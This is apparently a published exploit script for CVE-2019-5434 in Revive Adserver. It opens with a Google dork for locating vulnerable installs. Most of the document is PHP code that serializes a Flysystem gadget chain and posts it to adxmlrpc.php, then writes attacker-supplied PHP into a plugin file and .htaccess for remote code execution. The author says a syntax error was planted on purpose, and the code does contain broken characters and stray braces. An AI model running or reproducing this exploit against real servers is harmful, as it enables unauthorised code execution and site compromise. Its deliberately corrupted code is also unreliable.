# Google Dork: "inurl:www/delivery filetype:php"
# Exploit Author: crlf
# Vendor Homepage: https://www.revive-adserver.com/
# Software Link: https://www.revive-adserver.com/download/archive/
# Version: 4.1.x <= 4.2 RC1
# Tested on: *nix
# CVE : CVE-2019-5434
# Сontains syntax error for protection against skids


<?php
# Revive Adserver 4.1.x <= 4.2 RC1 PHP Object Injection to Remote Code Execution (CVE-2019-5434)
# coded by @crlf, with love for antichat.com
# special thanks to @Kaimi :)
# the script should be used only for educational purposes!

namespace{
  (!isset($argv[2]) ? exit(message(&#039;php &#039;.basename(__FILE__).&#039; https://example.com/adserver-dir/ \&#039;<?php phpinfo(); ?>\&#039;&#039;)) : @list($x, $url, $code) = $argv);

  $source = &#039;data:text/html;base64,&#039;.base64_encode(&#039;#&#039;);
  $destination = &#039;plugins/.htaccess&#039;;
  #$destination = &#039;var/.htaccess&#039;;

  if(!strpos(request($url, $source, $destination), &#039;methodResponse&#039;)) exit(message(&#039;failed, no valid response from &#039;.$url));

  $source = &#039;data:text/html;base64,&#039;.base64_encode($code);
  $destination = &#039;plugins/3rdPartyServers/ox3rdPartyServers/doubleclick.class.php&#039;;
  #$destination = &#039;var/default.conf.php&#039;;

  request($url, $source, $destination);
  message(&#039;check &#039;.$url.$destination);

  function request($url, $source, $destination){

    $what = serialize(
         [&#039;what&#039; =>
            new Pdp\Uri\Url(
                new League\Flysystem\File( $destination,
                    new League\Flysystem\File( &#039;x://&#039;.$source,
                        new League\Flysystem\MountManager(
                            new League\Flysystem\Filesystem(
                                new League\Flysystem\Config,
                                new League\Flysystem\Adapter\Local(&#039;&#039;)
                            ),
                            new League\Flysystem\Plugin\ForcedCopy
                        )
                    )
                )
            )
         ]
     );

    $what = str_replace([&#039;\Uri\Url\00&#039;],[&#039;\5CUri\5CUrl\00&#039;], str_replace([&#039;s:&#039;, сhr(0)],[&#039;S:&#039;, &#039;\\00&#039;], $what));

    $xml = &#039;<?xml version="1.0" encoding="ISO-8859-1"?>
              <methodCall>
               <methodName>openads.spc</methodName>
               <params>
                 <param>
                   <value>
                     <struct>
                       <member>
                         <name>remote_addr</name>
                         <value>8.8.8.8</value>
                       </member>
                       <member>
                         <name>cookies</name>
                         <value>
                           <array>
                           </array>
                         </value>
                       </member>
                     </struct>
                   </value>
                 </param>
                 <param><value><string>&#039;.$what.&#039;</string></value></param>
                 <param><value><string>0</string></value></param>
                 <param><value><string>dsad</string></value></param>
                 <param><value><boolean>1</boolean></value></param>
                 <param><value><boolean>0</boolean></value></param>
                 <param><value><boolean>1</boolean></value></param>
               </params>
             </methodCall>&#039;;

    return file_get_contents($url.&#039;adxmlrpc.php&#039;, false, stream_context_create(
                             [&#039;http&#039; =>
                               [&#039;method&#039; => &#039;POST&#039;,
                                &#039;user_agent&#039; => &#039;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0&#039;,
                                &#039;header&#039; =>&#039;Content-type: application/x-www-form-urlencoded&#039;,
                                &#039;content&#039;=> $xml
                                ]
                             ])
           );
  }

  function message($str){
     print PHP_EOL.&#039;### &#039;.$str.&#039; ###&#039;.PHP_EOL.PHP_EOL;
  }
}

namespace League\Flysystem\Plugin{
  class ForcedCopy{}
}

namespace League\Flysystem{
  class Config{
    protected $settings = [];
    public function __construct(){
       $this->settings = [&#039;disable_asserts&#039; => true];
    }
  }
  class Filesystem{
    protected $adapter;
    protected $config;
     public function __construct($config,$adapter){
       $this->config = $config;
       $this->adapter = $adapter;
     }
  }
  class MountManager{
    protected $filesystems = [];
    protected $plugins = [];
     public function __construct($filesystem, $handler){
       $this->filesystems = [&#039;x&#039; => $filesystem];
       $this->plugins = [&#039;__toString&#039; => $handler];
     }
  }
  class File{
    protected $path;
    protected $filesystem;
    public function __construct($path, $obj){
      $this->filesystem = $obj;
      $this->path = $path;
    }
  }
}

namespace League\Flysystem\Adapter{
  class Local{
    protected $pathPrefix;
     }
  }
}

namespace Pdp\Uri{
  class Url{
    private $host;
    public function __construct($file){
      $this->host = $file;
    }
  }
}

